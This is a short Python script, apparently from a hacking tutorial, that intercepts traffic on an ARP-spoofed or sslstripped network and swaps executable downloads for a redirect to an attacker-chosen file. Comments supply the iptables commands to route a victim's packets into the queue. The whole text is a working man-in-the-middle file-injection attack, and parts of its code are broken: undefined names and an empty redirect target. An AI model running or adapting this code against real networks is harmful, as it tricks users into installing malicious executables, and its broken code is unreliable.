#!/usr/bin/env python
# to ssl strip: iptables -t nat -A PREROUTING -p tcp --destingation-port 80 -j REDIRECT --to-port 10000, cant forward on iptables
# use input, output iptables when sslstrip

#use ip forwarding on other computer
#iptables -I INPUT -j NFQUEUE --queue-num 0
#iptables -I OUTPUT -j NFQUEUE --queue-num 0 to run on own computer, iptables --flush to reset
#iptables -I FORWARD -j NFQUEUE --queue-num 0 to run on arp spoofed computer

import netfilterqueue
import scapy.all as scapy


ack_list = []

def set_load(packet, load):
    packet[scapy.Raw].load =  load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet

def process_packet(packet):
    #change packet to scapy packet
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000: # set to 10000 when sslstrip
            # to avoid loops in sslstrip, check for exe file we want them to download in quotes
            if ".exe" in scapy_packet[scapy.Raw].load and "" not in scapy_packet[scapy.Raw].load:
                print("[+] exe Request")
                ack_list.append(scapy_packet[TCP].ack)
        elif scapy_packet[scapy.TCP].sport == 10000: # set 10000 when sslstrip, 80 otherwise
            if scapy_packet[TCP].seq in ack_list:
                ack_list.remove(scapy_packet[TCP].seq)
                print("[+] Replacing file")
                modified_packet = set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: \n\n") # any exe i want

                #reset scapy packet to regular packet
                packet.set_payload(str(modified_packet))

    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()